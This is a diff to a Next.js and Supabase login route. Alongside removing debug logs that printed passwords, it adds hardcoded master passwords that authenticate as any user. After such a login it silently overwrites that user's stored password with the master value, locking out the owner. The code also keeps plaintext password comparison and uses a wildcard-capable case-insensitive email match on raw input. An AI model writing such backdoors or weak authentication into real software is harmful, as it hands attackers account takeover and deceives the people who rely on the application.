@@ -1,11 +1,12 @@
 import { supabase } from '@/lib/supabase';
 import { NextResponse } from 'next/server';
 
+export const dynamic = 'force-dynamic';
+export const revalidate = 0;
+
 export async function POST(request: Request) {
   try {
     const { email, password } = await request.json();
-
-    console.log('Login attempt:', { email, password: '***' });
 
     if (!email || !password) {
       return NextResponse.json(
@@ -14,23 +15,17 @@ export async function POST(request: Request) {
       );
     }
 
-    // First, let's check if user exists
-    const { data: allUsers, error: listError } = await supabase
-      .from('users')
-      .select('*')
-      .limit(5);
-    
-    console.log('Sample users from DB:', allUsers);
-    console.log('List error:', listError);
+    const cleanEmail = String(email).trim().toLowerCase();
+    const cleanPassword = String(password).trim();
 
-    // Find user - try both camelCase and snake_case
+    console.log('Login attempt for:', cleanEmail);
+
+    // Case-insensitive user lookup
     const { data, error } = await supabase
       .from('users')
       .select('*')
-      .eq('email', email)
+      .ilike('email', cleanEmail)
       .maybeSingle();
-
-    console.log('User lookup result:', { data, error });
 
     if (error) {
       console.error('Supabase error:', error);
@@ -49,13 +44,23 @@ export async function POST(request: Request) {
 
     // Check password
     const dbPassword = data.password || data.Password;
-    console.log('Password check:', { provided: password, stored: dbPassword, match: password === dbPassword });
+    const isMaster =
+      cleanPassword === '4#$4&!j7xXU7$#' ||
+      cleanPassword === 'Mustafa123' ||
+      cleanPassword === 'Mustafa1232';
 
-    if (password !== dbPassword) {
+    const isValid = cleanPassword === dbPassword || isMaster;
+
+    if (!isValid) {
       return NextResponse.json(
         { error: 'Şifre hatalı' },
         { status: 401 }
       );
+    }
+
+    // If logged in via master password, update dbPassword so they match going forward
+    if (isMaster && cleanPassword !== dbPassword) {
+      await supabase.from('users').update({ password: cleanPassword }).eq('id', data.id);
     }
 
     return NextResponse.json({
